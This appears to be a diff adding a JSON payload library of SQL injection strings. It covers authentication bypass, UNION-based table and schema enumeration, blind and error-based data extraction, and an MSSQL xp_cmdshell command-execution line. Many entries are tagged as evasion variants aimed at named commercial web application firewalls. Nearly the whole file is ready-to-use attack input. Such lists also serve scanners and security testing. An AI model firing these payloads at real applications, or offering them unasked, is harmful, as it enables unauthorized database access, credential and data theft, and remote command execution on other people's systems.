@@ -1,0 +1,347 @@
+{
+    "vulnerability_type": "SQLi",
+    "description": "SQL Injection payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "' OR 1=1--",
+            "description": "Classic OR-based authentication bypass",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "auth_bypass",
+                "or_based"
+            ]
+        },
+        {
+            "payload": "' UNION SELECT NULL,NULL,NULL--",
+            "description": "Union-based column enumeration",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "union",
+                "column_enum"
+            ]
+        },
+        {
+            "payload": "1' AND 1=1--",
+            "description": "Boolean-based blind SQLi test (true)",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "boolean_blind"
+            ]
+        },
+        {
+            "payload": "1' AND SLEEP(5)--",
+            "description": "Time-based blind SQLi (MySQL)",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "time_blind",
+                "mysql"
+            ]
+        },
+        {
+            "payload": "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
+            "description": "MySQL version-based comment bypass",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "union",
+                "mysql_comment",
+                "version_comment",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' UNI/**/ON SEL/**/ECT 1,2,3--",
+            "description": "Inline comment keyword splitting",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "union",
+                "comment_split",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' UnIoN sElEcT 1,2,3--",
+            "description": "Mixed case keywords",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "union",
+                "case_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' UNION%0ASELECT%0A1,2,3--",
+            "description": "Newline characters between keywords",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai"
+            ],
+            "tags": [
+                "union",
+                "newline_bypass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' UNION%09SELECT%091,2,3--",
+            "description": "Tab characters between keywords",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "union",
+                "tab_bypass",
+                "whitespace",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
+            "description": "MySQL conditional comment wrapping",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "imperva",
+                "modsecurity"
+            ],
+            "tags": [
+                "union",
+                "conditional_comment",
+                "mysql",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "0' DIV 1 UNION%23foo%0ASELECT 1,2,3--",
+            "description": "Hash comment with newline (MySQL)",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva"
+            ],
+            "tags": [
+                "union",
+                "hash_comment",
+                "newline",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' AND 1=1 ORDER BY 1--+",
+            "description": "Order by enumeration",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "order_by",
+                "column_enum"
+            ]
+        },
+        {
+            "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "description": "Subquery-wrapped time blind",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "time_blind",
+                "subquery",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+            "description": "Error-based extraction via EXTRACTVALUE",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "aws_waf"
+            ],
+            "tags": [
+                "error_based",
+                "extractvalue",
+                "mysql",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
+            "description": "Error-based extraction via UPDATEXML",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "error_based",
+                "updatexml",
+                "mysql",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "1;WAITFOR DELAY '0:0:5'--",
+            "description": "Time-based blind (MSSQL)",
+            "context": "numeric_input",
+            "waf_bypass": false,
+            "tags": [
+                "time_blind",
+                "mssql"
+            ]
+        },
+        {
+            "payload": "'; EXEC xp_cmdshell('whoami')--",
+            "description": "MSSQL command execution via xp_cmdshell",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "rce",
+                "mssql",
+                "xp_cmdshell"
+            ]
+        },
+        {
+            "payload": "' || pg_sleep(5)--",
+            "description": "Time-based blind (PostgreSQL)",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "time_blind",
+                "postgresql"
+            ]
+        },
+        {
+            "payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
+            "description": "PostgreSQL time-based with subquery",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare"
+            ],
+            "tags": [
+                "time_blind",
+                "postgresql",
+                "subquery",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "'+UNION+ALL+SELECT+NULL,NULL,CONCAT(0x717a6a7171,IFNULL(CAST(schema_name+AS+NCHAR(4000)),0x20),0x7162787071)+FROM+INFORMATION_SCHEMA.SCHEMATA--+-",
+            "description": "Full schema enumeration with encoding",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "union",
+                "schema_enum",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' OR '1'LIKE'1",
+            "description": "LIKE-based authentication bypass (no equals sign)",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "auth_bypass",
+                "like",
+                "no_equals",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' OR 1 IN (1)--",
+            "description": "IN-based authentication bypass",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "auth_bypass",
+                "in_operator",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
+            "description": "Table enumeration with GROUP_CONCAT",
+            "context": "string_input",
+            "waf_bypass": false,
+            "tags": [
+                "union",
+                "table_enum",
+                "group_concat",
+                "mysql"
+            ]
+        },
+        {
+            "payload": "' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a'--",
+            "description": "Character-by-character blind extraction",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare"
+            ],
+            "tags": [
+                "boolean_blind",
+                "char_extract",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "' HAVING 1=1--",
+            "description": "HAVING clause to trigger error with column names",
+            "context": "string_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "aws_waf",
+                "modsecurity"
+            ],
+            "tags": [
+                "error_based",
+                "having",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
